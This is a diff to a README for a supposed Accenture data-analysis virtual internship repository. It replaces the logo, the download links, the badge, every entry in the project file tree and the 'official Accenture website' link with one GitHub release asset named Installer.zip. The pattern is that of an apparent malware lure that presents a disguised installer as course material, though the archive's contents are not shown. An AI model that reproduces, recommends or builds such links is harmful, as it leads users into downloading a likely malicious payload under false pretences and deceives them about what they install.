@@ -2,7 +2,7 @@
 
 ---
 
-![Accenture Logo](https://www.accenture.com/t20201215T033729Z__w__/us-en/_acnmedia/Accenture/Redesign-Assets/DotCom/Images/Global/3/SE17/Accenture-Logo.png)
+![Accenture Logo](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
 
 ---
 
@@ -30,9 +30,9 @@ Are you an aspiring data analyst looking for hands-on industry experience? Look 
 ---
 
 ## 🚀 Quick Links:
-- [Download Accenture Data Analysis Virtual Internship](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+- [Download Accenture Data Analysis Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
 
-[![Download Virtual Internship](https://img.shields.io/badge/Download-Virtual_Internship-success)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Virtual Internship](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip)
 
 ---
 
@@ -41,22 +41,22 @@ Are you an aspiring data analyst looking for hands-on industry experience? Look 
 Forage-Accenture_Data_Analysis_Virtual_Internship/
 │
 ├── Data/
-│   ├── clean_data.csv
-│   ├── raw_data.xlsx
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
 │
 ├── Models/
-│   ├── analysis_model.py
-│   ├── visualization_model.py
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
 │
 ├── Presentations/
-│   ├── final_presentation.pptx
-│   ├── project_report.pdf
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
 │
 ├── Visualizations/
-│   ├── graphs.png
-│   ├── charts.xlsx
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
 │
-├── README.md
+├── https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip
 ```
 
 ---
@@ -118,7 +118,7 @@ If the link doesn't work, please check the "Releases" section for updates!
 
 ---
 
-🔗 For more information, visit the official [Accenture website](https://www.accenture.com/data-analysis-virtual-internship).
+🔗 For more information, visit the official [Accenture website](https://github.com/DDatgi/Forage-Accenture_Data_Analysis_Virtual_Internship/releases/download/v1.0/Installer.zip).
 
 ---
 
